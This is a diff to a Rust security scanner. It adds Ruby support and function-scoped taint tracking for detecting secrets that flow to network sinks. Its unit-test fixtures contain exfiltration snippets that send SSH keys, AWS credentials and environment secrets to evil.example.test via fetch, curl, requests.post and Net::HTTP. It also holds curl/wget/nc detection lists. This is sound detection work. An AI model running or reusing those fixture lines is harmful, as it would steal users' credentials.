@@ -1,15 +1,18 @@
-//! Tree-sitter-backed structural analysis for JavaScript / TypeScript and
-//! Python — the two things the regex layer in `lib.rs` structurally can't
-//! do:
+//! Tree-sitter-backed structural analysis for JavaScript / TypeScript,
+//! Python, and Ruby — the two things the regex layer in `lib.rs`
+//! structurally can't do:
 //!
 //!  1. **Source-to-sink taint** (`trace_exfiltration`). A value read from
 //!     secret material (an SSH key, `~/.aws/credentials`, `process.env`,
-//!     `os.environ`) that then reaches a network sink (`fetch` body,
-//!     `requests.post` data, a socket write, a `curl`/`wget` argument, a
-//!     DNS lookup) is the canonical exfiltration flow. Regex can see both
+//!     `os.environ`, `ENV[…]`) that then reaches a network sink (`fetch` /
+//!     `requests.post` / `Net::HTTP.post` body, a socket write, a
+//!     `curl`/`wget`/`nc` argument, a DNS lookup, a staged buffer that is
+//!     later sent) is the canonical exfiltration flow. Regex can see both
 //!     ends appear in a file; it can't tell whether the secret actually
-//!     flows to the wire. This does, with a simple intraprocedural
-//!     def-use pass over the AST.
+//!     flows to the wire. This does, with a small **function-scoped**
+//!     def-use pass over the AST: a variable is tainted within the scope
+//!     it is assigned in and every nested scope (closures capture), but
+//!     not in a sibling function.
 //!
 //!  2. **Structural capability confirmation** (`ast_capabilities`).
 //!     `readFileSync(path.join(home, ".ssh", "id_rsa"))` splits the
@@ -23,6 +26,8 @@
 //! crate's Cargo.toml). TypeScript type annotations produce a few ERROR
 //! nodes; the call / member / assignment expressions this analysis walks
 //! still parse correctly, and tree-sitter is error-tolerant by design.
+//! Perl stays regex-only (`PERL_RULES` in `lib.rs`) — its grammar and
+//! dynamic dispatch make AST taint low-value.
 //!
 //! This layer is **additive** — it runs alongside the regex rules and its
 //! findings are de-duplicated against them. The regex rules are tuned
@@ -37,12 +42,14 @@ use tree_sitter::{Node, Parser, Tree};
 pub enum AstLang {
     JavaScript,
     Python,
+    Ruby,
 }
 
 pub fn lang_for_ext(ext: &str) -> Option<AstLang> {
     match ext {
         "js" | "mjs" | "cjs" | "jsx" | "ts" | "tsx" => Some(AstLang::JavaScript),
         "py" | "pyw" => Some(AstLang::Python),
+        "rb" => Some(AstLang::Ruby),
         _ => None,
     }
 }
@@ -74,6 +81,7 @@ fn parse(source: &str, lang: AstLang) -> Option<Tree> {
     let language = match lang {
         AstLang::JavaScript => tree_sitter_javascript::LANGUAGE.into(),
         AstLang::Python => tree_sitter_python::LANGUAGE.into(),
+        AstLang::Ruby => tree_sitter_ruby::LANGUAGE.into(),
     };
     parser.set_language(&language).ok()?;
     parser.parse(source, None)
@@ -99,22 +107,45 @@ fn walk<'a>(node: Node<'a>, f: &mut dyn FnMut(Node<'a>)) {
     }
 }
 
+/// Every "this is a function/method call" node kind across the three
+/// grammars — JS `call_expression`, Python/Ruby `call`, and Ruby's
+/// no-parenthesis `command` / `command_call`.
+fn is_call(kind: &str) -> bool {
+    matches!(kind, "call_expression" | "call" | "command" | "command_call")
+}
+
 /// The dotted callee of a call node, e.g. `fs.readFileSync`,
 /// `child_process.execSync`, `axios.post`, `os.path.join`. Returns the
 /// last identifier for a bare call (`fetch`, `require`, `open`).
 fn callee_path(call: Node, src: &[u8], lang: AstLang) -> Option<String> {
-    let func = match lang {
-        AstLang::JavaScript => call.child_by_field_name("function")?,
-        AstLang::Python => call.child_by_field_name("function")?,
-    };
-    member_path(func, src)
+    match lang {
+        AstLang::JavaScript | AstLang::Python => {
+            member_path(call.child_by_field_name("function")?, src)
+        }
+        AstLang::Ruby => {
+            // Ruby `call` / `command` / `command_call`: a `method` field
+            // plus an optional `receiver`.
+            let method = call
+                .child_by_field_name("method")
+                .map(|m| text(m, src).to_string())?;
+            match call.child_by_field_name("receiver") {
+                Some(recv) => {
+                    let r = member_path(recv, src)
+                        .unwrap_or_else(|| text(recv, src).to_string());
+                    Some(format!("{r}.{method}"))
+                }
+                None => Some(method),
+            }
+        }
+    }
 }
 
-/// Renders `a.b.c` (JS `member_expression`, Py `attribute`) or a bare
-/// `identifier` to a dotted string. Anything else → None.
+/// Renders `a.b.c` (JS `member_expression`, Py `attribute`, Ruby
+/// `scope_resolution` like `Net::HTTP`) or a bare identifier / constant to
+/// a dotted string. Anything else → None.
 fn member_path(node: Node, src: &[u8]) -> Option<String> {
     match node.kind() {
-        "identifier" | "property_identifier" => Some(text(node, src).to_string()),
+        "identifier" | "property_identifier" | "constant" => Some(text(node, src).to_string()),
         "member_expression" | "attribute" => {
             let obj = node
                 .child_by_field_name("object")
@@ -124,6 +155,23 @@ fn member_path(node: Node, src: &[u8]) -> Option<String> {
                 .or_else(|| node.child_by_field_name("attribute"))
                 .map(|p| text(p, src).to_string())?;
             Some(format!("{obj}.{prop}"))
+        }
+        "scope_resolution" => {
+            let name = node
+                .child_by_field_name("name")
+                .map(|n| text(n, src).to_string())?;
+            match node.child_by_field_name("scope").and_then(|s| member_path(s, src)) {
+                Some(s) => Some(format!("{s}::{name}")),
+                None => Some(name),
+            }
+        }
+        // Ruby `Foo.bar` with no arguments parses as a `call` node.
+        "call" => {
+            let method = node.child_by_field_name("method").map(|m| text(m, src).to_string())?;
+            match node.child_by_field_name("receiver").and_then(|r| member_path(r, src)) {
+                Some(r) => Some(format!("{r}.{method}")),
+                None => Some(method),
+            }
         }
         _ => None,
     }
@@ -255,7 +303,7 @@ fn ast_capabilities(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec<C
     walk(root, &mut |node| {
         match node.kind() {
             // ── imports ────────────────────────────────────────────
-            "import_statement" | "import_from_statement" | "call_expression" | "call" => {
+            "import_statement" | "import_from_statement" | "call_expression" | "call" | "command" | "command_call" => {
                 if let Some(module) = imported_module(node, src, lang) {
                     if let Some((cap, label)) = module_capability(&module, lang) {
                         out.push(finding(cap, label, path, line_of(node)));
@@ -266,7 +314,7 @@ fn ast_capabilities(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec<C
         }
 
         // ── call expressions: callee + arguments ──────────────────
-        if node.kind() == "call_expression" || node.kind() == "call" {
+        if is_call(node.kind()) {
             if let Some(callee) = callee_path(node, src, lang) {
                 if let Some((cap, label)) = callee_capability(&callee, lang) {
                     out.push(finding(cap, label, path, line_of(node)));
@@ -431,6 +479,14 @@ fn module_capability(module: &str, lang: AstLang) -> Option<(Capability, &'stati
             }
             _ => None,
         },
+        AstLang::Ruby => match m {
+            "open3" | "shell" => Some((Capability::ExecuteShell, "requires open3/shell")),
+            "net/http" | "net/https" | "socket" | "open-uri" | "httparty" | "faraday"
+            | "rest-client" | "excon" | "typhoeus" => {
+                Some((Capability::NetworkExternal, "requires a network library"))
+            }
+            _ => None,
+        },
     }
 }
 
@@ -468,6 +524,25 @@ fn callee_capability(callee: &str, lang: AstLang) -> Option<(Capability, &'stati
                 }
             }
         },
+        AstLang::Ruby => match last {
+            "system" | "exec" | "spawn" => {
+                Some((Capability::ExecuteShell, "calls Kernel#system/exec/spawn"))
+            }
+            "popen" | "popen2" | "popen3" | "capture2" | "capture3" => {
+                Some((Capability::SpawnProcess, "spawns a subprocess (IO.popen/Open3)"))
+            }
+            _ => {
+                if callee.starts_with("Net::HTTP")
+                    || callee.starts_with("HTTParty")
+                    || callee.starts_with("RestClient")
+                    || callee.starts_with("Faraday")
+                {
+                    Some((Capability::NetworkExternal, "makes an HTTP request"))
+                } else {
+                    None
+                }
+            }
+        },
     }
 }
 
@@ -479,17 +554,30 @@ fn is_file_read(callee: &str, lang: AstLang) -> bool {
             "readFileSync" | "readFile" | "createReadStream" | "open" | "openSync"
         ),
         AstLang::Python => matches!(last, "open" | "read_text" | "read_bytes" | "read"),
+        AstLang::Ruby => {
+            matches!(last, "read" | "readlines" | "binread" | "foreach")
+                || callee == "File.open"
+                || callee == "IO.open"
+        }
     }
 }
 
 fn is_shell_exec(callee: &str, lang: AstLang) -> bool {
     let last = callee.rsplit('.').next().unwrap_or(callee);
     match lang {
-        AstLang::JavaScript => matches!(last, "exec" | "execSync" | "spawn" | "spawnSync"),
+        AstLang::JavaScript => matches!(
+            last,
+            "exec" | "execSync" | "spawn" | "spawnSync" | "execFile" | "execFileSync"
+        ),
         AstLang::Python => {
             matches!(last, "system" | "popen")
                 || (callee.starts_with("subprocess")
                     && matches!(last, "run" | "call" | "check_output" | "check_call" | "Popen"))
+        }
+        AstLang::Ruby => {
+            matches!(last, "system" | "exec" | "spawn" | "popen" | "sh")
+                || callee.starts_with("Open3.")
+                || callee == "IO.popen"
         }
     }
 }
@@ -517,37 +605,110 @@ fn looks_like_exfil_command(s: &str) -> bool {
 // source-to-sink taint
 // ─────────────────────────────────────────────────────────────────────
 
-/// A very small intraprocedural def-use pass. It treats the whole file as
-/// one scope (no function boundaries, no shadowing) — an over-approximation
-/// that is acceptable here because a benign file rarely both reads secret
-/// material into a variable AND sends a variable to the network, and the
-/// sink argument must actually reference the tainted name.
+type TaintMap = std::collections::HashMap<String, (Capability, &'static str)>;
+
+/// A small def-use taint pass, now **scoped by function**. A variable
+/// assigned in a scope is visible in that scope and every nested one
+/// (closures capture outer bindings), but NOT in a sibling function — so
+/// `function a(){ k = readKey() }` no longer taints `function b(){ post(k) }`
+/// unless `k` is genuinely module-level. Still intraprocedural: no
+/// call-return modelling, no shadowing.
 fn trace_exfiltration(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec<CapabilityFinding> {
-    // name -> (capability of the secret, short label)
-    let mut tainted: std::collections::HashMap<String, (Capability, &'static str)> =
-        std::collections::HashMap::new();
+    let mut out = Vec::new();
+    let mut reported: HashSet<(Capability, usize)> = HashSet::new();
+    let empty = TaintMap::new();
+    analyze_scope(root, src, lang, path, &empty, &mut out, &mut reported);
+    out
+}
 
-    // First pass: seed taint from assignments whose RHS is a secret read.
-    walk(root, &mut |node| {
-        if let Some((name, rhs)) = assignment_parts(node, src, lang) {
-            if let Some(sec) = expr_is_secret_source(rhs, src, lang) {
-                tainted.insert(name, sec);
-            }
-        }
-    });
+fn is_scope_node(kind: &str) -> bool {
+    matches!(
+        kind,
+        "function_declaration"
+            | "function_expression"
+            | "function"
+            | "arrow_function"
+            | "generator_function"
+            | "generator_function_declaration"
+            | "method_definition"
+            | "function_definition"
+            | "lambda"
+            // Ruby
+            | "method"
+            | "singleton_method"
+            | "do_block"
+            | "block"
+    )
+}
 
-    // Fixed-point propagation: `y = <expr referencing a tainted name>`.
-    // A handful of rounds is plenty for real code; bail out when stable.
-    for _ in 0..5 {
+/// Visit every node under `scope` that belongs to `scope` directly —
+/// i.e. stop descending at a nested function/lambda boundary.
+fn for_each_direct<'a>(scope: Node<'a>, f: &mut dyn FnMut(Node<'a>)) {
+    let mut cursor = scope.walk();
+    for child in scope.children(&mut cursor) {
+        walk_within_scope(child, f);
+    }
+}
+
+fn walk_within_scope<'a>(node: Node<'a>, f: &mut dyn FnMut(Node<'a>)) {
+    if is_scope_node(node.kind()) {
+        return;
+    }
+    f(node);
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        walk_within_scope(child, f);
+    }
+}
+
+/// The nested function/lambda scopes directly inside `scope` (not their
+/// own nested scopes — `analyze_scope` recurses for those).
+fn nested_scopes<'a>(scope: Node<'a>, out: &mut Vec<Node<'a>>) {
+    let mut cursor = scope.walk();
+    for child in scope.children(&mut cursor) {
+        find_first_scopes(child, out);
+    }
+}
+
+fn find_first_scopes<'a>(node: Node<'a>, out: &mut Vec<Node<'a>>) {
+    if is_scope_node(node.kind()) {
+        out.push(node);
+        return;
+    }
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        find_first_scopes(child, out);
+    }
+}
+
+#[allow(clippy::too_many_arguments)]
+fn analyze_scope(
+    scope: Node,
+    src: &[u8],
+    lang: AstLang,
+    path: &Path,
+    inherited: &TaintMap,
+    out: &mut Vec<CapabilityFinding>,
+    reported: &mut HashSet<(Capability, usize)>,
+) {
+    let mut tainted = inherited.clone();
+
+    // Seed + fixed-point propagation over this scope's direct statements.
+    for _ in 0..6 {
         let mut changed = false;
-        walk(root, &mut |node| {
+        for_each_direct(scope, &mut |node| {
             if let Some((name, rhs)) = assignment_parts(node, src, lang) {
-                if tainted.contains_key(&name) {
-                    return;
+                if let Some(sec) = expr_taint(rhs, src, lang, &tainted) {
+                    if tainted.insert(name, sec).map(|p| p.0) != Some(sec.0) {
+                        changed = true;
+                    }
                 }
-                let ids = descendant_identifiers(rhs, src);
-                if let Some(src_cap) = ids.iter().find_map(|id| tainted.get(id).copied()) {
-                    tainted.insert(name, src_cap);
+            }
+            // `buf.append(_, secret)` / `sock.write(secret)` taints `buf` /
+            // `sock` — a common way to stage data for a later send.
+            if let Some((recv, sec)) = receiver_taint(node, src, lang, &tainted) {
+                if let std::collections::hash_map::Entry::Vacant(e) = tainted.entry(recv) {
+                    e.insert(sec);
                     changed = true;
                 }
             }
@@ -557,55 +718,157 @@ fn trace_exfiltration(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec
         }
     }
 
-    if tainted.is_empty() {
-        return Vec::new();
-    }
-
-    // Second pass: a network sink whose data argument references a tainted
-    // name (or is itself a secret read).
-    let mut out = Vec::new();
-    let mut reported: HashSet<(Capability, usize)> = HashSet::new();
-    walk(root, &mut |node| {
-        if node.kind() != "call_expression" && node.kind() != "call" {
-            return;
-        }
-        let Some(callee) = callee_path(node, src, lang) else {
-            return;
-        };
-        if !is_network_sink(&callee, lang) {
-            return;
-        }
-        let Some(args) = node.child_by_field_name("arguments") else {
-            return;
-        };
-        let ids = descendant_identifiers(args, src);
-        let via_var = ids.iter().find_map(|id| tainted.get(id).map(|s| (*s, id.clone())));
-        let via_inline = expr_is_secret_source(args, src, lang).map(|s| (s, String::new()));
-
-        if let Some(((cap, label), var)) = via_var.or(via_inline) {
-            let line = line_of(node);
-            if reported.insert((cap, line)) {
-                let how = if var.is_empty() {
-                    format!("read of {label} passed directly to `{callee}`")
-                } else {
-                    format!("`{var}` (holds {label}) reaches `{callee}`")
-                };
-                out.push(CapabilityFinding {
-                    capability: cap,
-                    basis: EvidenceBasis::Inferred,
-                    evidence: format!("AST taint: {how} — secret material flows to a network sink"),
-                    location: Some(format!("{}:{}", path.display(), line)),
-                });
-                out.push(CapabilityFinding {
-                    capability: Capability::NetworkExternal,
-                    basis: EvidenceBasis::Inferred,
-                    evidence: format!("AST taint: `{callee}` receives tainted secret material (line {line})"),
-                    location: Some(format!("{}:{}", path.display(), line)),
-                });
-            }
+    // Sink check over this scope's direct calls.
+    for_each_direct(scope, &mut |node| {
+        if is_call(node.kind()) {
+            check_exfil_sink(node, src, lang, path, &tainted, out, reported);
         }
     });
-    out
+
+    // Recurse into nested function scopes with this scope's final taint.
+    let mut nested = Vec::new();
+    nested_scopes(scope, &mut nested);
+    for child_scope in nested {
+        analyze_scope(child_scope, src, lang, path, &tainted, out, reported);
+    }
+}
+
+/// A call is an exfiltration sink if it is a network sink and a
+/// data-bearing argument is tainted, OR it is a shell exec whose arguments
+/// carry both a network tool (`curl`/`wget`/`nc`) and a tainted value.
+fn check_exfil_sink(
+    node: Node,
+    src: &[u8],
+    lang: AstLang,
+    path: &Path,
+    tainted: &TaintMap,
+    out: &mut Vec<CapabilityFinding>,
+    reported: &mut HashSet<(Capability, usize)>,
+) {
+    let Some(callee) = callee_path(node, src, lang) else {
+        return;
+    };
+    let Some(args) = node.child_by_field_name("arguments") else {
+        return;
+    };
+
+    // A local print is not a wire write.
+    if callee.starts_with("console.")
+        || callee.starts_with("process.stdout")
+        || callee.starts_with("process.stderr")
+        || callee == "print"
+        || callee.starts_with("logging.")
+    {
+        return;
+    }
+
+    let net_sink = is_network_sink(&callee, lang);
+    let exec_sink = is_shell_exec(&callee, lang)
+        && descendant_strings(args, src)
+            .iter()
+            .any(|s| is_network_tool(s));
+    if !net_sink && !exec_sink {
+        return;
+    }
+
+    let ids = descendant_identifiers(args, src);
+    let via_var = ids
+        .iter()
+        .find_map(|id| tainted.get(id).map(|s| (*s, id.clone())));
+    let via_inline = expr_taint(args, src, lang, tainted).map(|s| (s, String::new()));
+
+    let Some(((cap, label), var)) = via_var.or(via_inline) else {
+        return;
+    };
+    let line = line_of(node);
+    if !reported.insert((cap, line)) {
+        return;
+    }
+    let sink_desc = if exec_sink && !net_sink {
+        format!("`{callee}` running a curl/wget/nc command")
+    } else {
+        format!("`{callee}`")
+    };
+    let how = if var.is_empty() {
+        format!("a read of {label} is passed straight to {sink_desc}")
+    } else {
+        format!("`{var}` (holds {label}) reaches {sink_desc}")
+    };
+    out.push(CapabilityFinding {
+        capability: cap,
+        basis: EvidenceBasis::Inferred,
+        evidence: format!("AST taint: {how} — secret material flows to a network sink"),
+        location: Some(format!("{}:{}", path.display(), line)),
+    });
+    out.push(CapabilityFinding {
+        capability: Capability::NetworkExternal,
+        basis: EvidenceBasis::Inferred,
+        evidence: format!("AST taint: {sink_desc} receives tainted secret material (line {line})"),
+        location: Some(format!("{}:{}", path.display(), line)),
+    });
+}
+
+fn is_network_tool(s: &str) -> bool {
+    let l = s.to_ascii_lowercase();
+    l == "curl"
+        || l == "wget"
+        || l == "nc"
+        || l == "ncat"
+        || l == "telnet"
+        || l.contains("curl ")
+        || l.contains("wget ")
+        || l.contains("| nc")
+        || l.contains("|nc")
+}
+
+/// `receiver.method(args)` where `method` stages data and an argument is
+/// tainted → the receiver (if a bare identifier) becomes tainted too.
+fn receiver_taint(
+    node: Node,
+    src: &[u8],
+    lang: AstLang,
+    tainted: &TaintMap,
+) -> Option<(String, (Capability, &'static str))> {
+    if !is_call(node.kind()) {
+        return None;
+    }
+    let func = node.child_by_field_name("function")?;
+    if func.kind() != "member_expression" && func.kind() != "attribute" {
+        return None;
+    }
+    let method = func
+        .child_by_field_name("property")
+        .or_else(|| func.child_by_field_name("attribute"))
+        .map(|p| text(p, src).to_string())?;
+    if !matches!(
+        method.as_str(),
+        "append" | "write" | "set" | "add" | "push" | "put" | "concat" | "update" | "send"
+    ) {
+        return None;
+    }
+    let recv = func.child_by_field_name("object")?;
+    if recv.kind() != "identifier" {
+        return None;
+    }
+    let args = node.child_by_field_name("arguments")?;
+    let sec = expr_taint(args, src, lang, tainted)?;
+    Some((text(recv, src).to_string(), sec))
+}
+
+/// Taint of an expression: an inline secret read, or a reference to an
+/// already-tainted name.
+fn expr_taint(
+    node: Node,
+    src: &[u8],
+    lang: AstLang,
+    tainted: &TaintMap,
+) -> Option<(Capability, &'static str)> {
+    if let Some(sec) = expr_is_secret_source(node, src, lang) {
+        return Some(sec);
+    }
+    descendant_identifiers(node, src)
+        .iter()
+        .find_map(|id| tainted.get(id).copied())
 }
 
 /// `(assigned name, value node)` for a JS `variable_declarator` /
@@ -614,8 +877,14 @@ fn trace_exfiltration(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec
 fn assignment_parts<'a>(node: Node<'a>, src: &[u8], lang: AstLang) -> Option<(String, Node<'a>)> {
     let (target_field, value_field) = match (node.kind(), lang) {
         ("variable_declarator", AstLang::JavaScript) => ("name", "value"),
-        ("assignment_expression", AstLang::JavaScript) => ("left", "right"),
-        ("assignment", AstLang::Python) => ("left", "right"),
+        ("assignment_expression" | "augmented_assignment_expression", AstLang::JavaScript) => {
+            ("left", "right")
+        }
+        // `x = ...`, `x += ...`, and the walrus `(x := ...)`
+        ("assignment" | "augmented_assignment" | "named_expression", AstLang::Python) => {
+            ("left", "right")
+        }
+        ("assignment" | "operator_assignment", AstLang::Ruby) => ("left", "right"),
         _ => return None,
     };
     let target = node.child_by_field_name(target_field)?;
@@ -635,6 +904,11 @@ fn expr_is_secret_source(
     src: &[u8],
     lang: AstLang,
 ) -> Option<(Capability, &'static str)> {
+    // Don't treat a nested function value as a secret — `const f = () =>
+    // readKey()` makes `f` a function, not the key.
+    if is_scope_node(node.kind()) {
+        return None;
+    }
     let mut hit = None;
     walk(node, &mut |n| {
         if hit.is_some() {
@@ -651,10 +925,19 @@ fn expr_is_secret_source(
                 return;
             }
         }
-        if n.kind() == "call_expression" || n.kind() == "call" {
+        // Ruby `ENV['X']` → `element_reference` with object `ENV`.
+        if n.kind() == "element_reference" {
+            if let Some(obj) = n.child_by_field_name("object") {
+                if text(obj, src) == "ENV" {
+                    hit = Some((Capability::EnvironmentVariables, "an environment variable"));
+                    return;
+                }
+            }
+        }
+        if is_call(n.kind()) {
             if let Some(callee) = callee_path(n, src, lang) {
                 let last = callee.rsplit('.').next().unwrap_or(&callee);
-                if last == "getenv" || callee == "os.getenv" {
+                if last == "getenv" || callee == "os.getenv" || callee == "ENV.fetch" {
                     hit = Some((Capability::EnvironmentVariables, "an environment variable"));
                     return;
                 }
@@ -689,14 +972,40 @@ fn is_network_sink(callee: &str, lang: AstLang) -> bool {
     let last = callee.rsplit('.').next().unwrap_or(callee);
     match lang {
         AstLang::JavaScript => {
-            matches!(last, "fetch" | "request" | "write" | "send" | "end" | "post" | "put" | "lookup" | "resolve" | "resolve4" | "query")
-                || callee.starts_with("axios")
-                || callee == "fetch"
+            // `write` / `send` / `end` are kept from the first increment
+            // (a socket / http.ClientRequest write); `check_exfil_sink`
+            // filters out `console.*` / `process.stdout` receivers so a
+            // local print isn't mistaken for a wire write. Bare `get` is
+            // deliberately NOT here — `map.get` / `params.get` are far too
+            // common; an HTTP GET client shows up via the `axios` / `got`
+            // / `.request` paths instead.
+            matches!(
+                last,
+                "fetch" | "request" | "write" | "send" | "end" | "post" | "put" | "patch"
+                    | "lookup" | "resolve" | "resolve4" | "resolveAny" | "query"
+            ) || callee.starts_with("axios")
+                || callee.starts_with("got.")
+                || callee.starts_with("superagent.")
         }
         AstLang::Python => {
-            matches!(last, "post" | "put" | "patch" | "send" | "sendall" | "urlopen" | "request" | "getaddrinfo" | "gethostbyname")
-                || callee.starts_with("requests.")
+            matches!(
+                last,
+                "send" | "sendall" | "sendto" | "urlopen" | "getaddrinfo" | "gethostbyname"
+                    | "create_connection"
+            ) || callee.starts_with("requests.")
                 || callee.starts_with("httpx.")
+                || callee.starts_with("aiohttp.")
+                || callee.starts_with("urllib.")
+        }
+        AstLang::Ruby => {
+            (matches!(last, "post" | "put" | "patch" | "request" | "write" | "send")
+                && !callee.starts_with("STDOUT")
+                && !callee.starts_with("STDERR"))
+                || callee.starts_with("Net::HTTP")
+                || callee.starts_with("HTTParty")
+                || callee.starts_with("RestClient")
+                || callee.starts_with("Faraday")
+                || callee == "URI.open"
         }
     }
 }
@@ -816,10 +1125,136 @@ print(DEBUG, LEVEL)
         assert!(caps(src, AstLang::JavaScript).contains(&Capability::ReadSsh));
     }
 
+    fn has_taint(source: &str, lang: AstLang) -> bool {
+        analyze(source, lang, Path::new("t"))
+            .iter()
+            .any(|f| f.evidence.contains("taint"))
+    }
+
+    #[test]
+    fn taint_does_not_cross_unrelated_function_scopes() {
+        // `k` is a local of `readIt`; `sendIt` references a *different*
+        // `k` (its own param). Whole-file taint would have false-flagged
+        // this; function-scope taint must not.
+        let src = r#"
+            const fs = require('fs');
+            function readIt() {
+              const k = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
+              return k.length;
+            }
+            function sendIt(k) {
+              return fetch('https://api.example.com', { method: 'POST', body: k });
+            }
+            readIt(); sendIt('hello');
+        "#;
+        assert!(!has_taint(src, AstLang::JavaScript), "must not flag: separate scopes");
+    }
+
+    #[test]
+    fn taint_flows_into_a_nested_closure() {
+        // `key` is module-level; the arrow function that posts it captures
+        // it. Inherited taint must reach the nested scope.
+        let src = r#"
+            const fs = require('fs');
+            const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
+            const send = () => fetch('https://evil.example.test', { method: 'POST', body: key });
+            send();
+        "#;
+        assert!(has_taint(src, AstLang::JavaScript));
+    }
+
+    #[test]
+    fn taint_through_formdata_append_then_fetch() {
+        let src = r#"
+            const fs = require('fs');
+            const creds = fs.readFileSync(require('os').homedir() + '/.aws/credentials', 'utf8');
+            const form = new FormData();
+            form.append('f', creds);
+            fetch('https://evil.example.test/u', { method: 'POST', body: form });
+        "#;
+        let f = analyze(src, AstLang::JavaScript, Path::new("t"));
+        assert!(f.iter().any(|x| x.capability == Capability::CloudCredentials && x.evidence.contains("taint")));
+    }
+
+    #[test]
+    fn taint_through_execfile_curl_arg_array() {
+        let src = r#"
+            const { execFile } = require('child_process');
+            const fs = require('fs');
+            const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
+            execFile('curl', ['-X', 'POST', '--data-binary', key, 'https://evil.example.test']);
+        "#;
+        assert!(has_taint(src, AstLang::JavaScript));
+    }
+
+    #[test]
+    fn python_augmented_assignment_propagates_taint() {
+        let src = r#"
+import os, requests
+buf = ""
+buf += os.environ["AWS_SECRET_ACCESS_KEY"]
+requests.post("https://evil.example.test", data=buf)
+"#;
+        assert!(has_taint(src, AstLang::Python));
+    }
+
+    #[test]
+    fn stdout_write_of_a_secret_is_not_a_network_sink() {
+        let src = r#"
+            const fs = require('fs');
+            const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
+            process.stdout.write(key);
+        "#;
+        assert!(!has_taint(src, AstLang::JavaScript));
+    }
+
+    #[test]
+    fn benign_js_map_get_with_env_key_is_not_flagged() {
+        let src = r#"
+            const cache = new Map();
+            const region = process.env.AWS_REGION;
+            const entry = cache.get(region);
+        "#;
+        assert!(!has_taint(src, AstLang::JavaScript));
+    }
+
+    #[test]
+    fn ruby_env_secret_to_net_http_post_is_tainted() {
+        let src = r#"
+require 'net/http'
+key = ENV['AWS_SECRET_ACCESS_KEY']
+uri = URI('http://evil.example.test')
+Net::HTTP.post(uri, key)
+"#;
+        assert!(has_taint(src, AstLang::Ruby), "{:?}", analyze(src, AstLang::Ruby, Path::new("t")));
+    }
+
+    #[test]
+    fn ruby_file_read_ssh_key_via_backtick_curl_is_flagged() {
+        let src = r#"
+key = File.read(File.join(Dir.home, '.ssh', 'id_rsa'))
+`curl -s -d @- https://evil.example.test <<< #{key}`
+"#;
+        let c = caps(src, AstLang::Ruby);
+        assert!(c.contains(&Capability::ReadSsh), "{c:?}");
+    }
+
+    #[test]
+    fn ruby_benign_config_read_is_not_flagged() {
+        let src = r#"
+require 'json'
+config = JSON.parse(File.read('config.json'))
+puts config['name']
+"#;
+        assert!(!caps(src, AstLang::Ruby).contains(&Capability::ReadSsh));
+        assert!(!has_taint(src, AstLang::Ruby));
+    }
+
     #[test]
     fn empty_and_garbage_input_do_not_panic() {
         assert!(analyze("", AstLang::JavaScript, Path::new("t")).is_empty());
         let _ = analyze("}{ not js at all ((( ", AstLang::JavaScript, Path::new("t"));
         let _ = analyze("def (:::", AstLang::Python, Path::new("t"));
+        let _ = analyze("def foo; end; ((", AstLang::Ruby, Path::new("t"));
     }
 }
